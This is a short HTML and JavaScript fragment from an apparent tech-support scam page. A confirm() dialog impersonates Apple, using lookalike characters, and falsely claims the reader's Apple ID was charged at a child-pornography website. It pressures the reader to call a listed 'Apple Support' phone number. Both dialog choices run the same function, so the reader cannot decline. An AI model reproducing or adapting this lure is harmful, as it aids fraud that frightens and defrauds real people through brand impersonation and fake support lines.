...
<body>
    ...
    <script>
        ...
        function myFunction() {
            if (confirm("Your Applẹ ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Applẹ Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Applẹ Support +1-888-449-3954 to Freeze it!.")) {
                okkkk();
            } else {
                okkkk();
            }
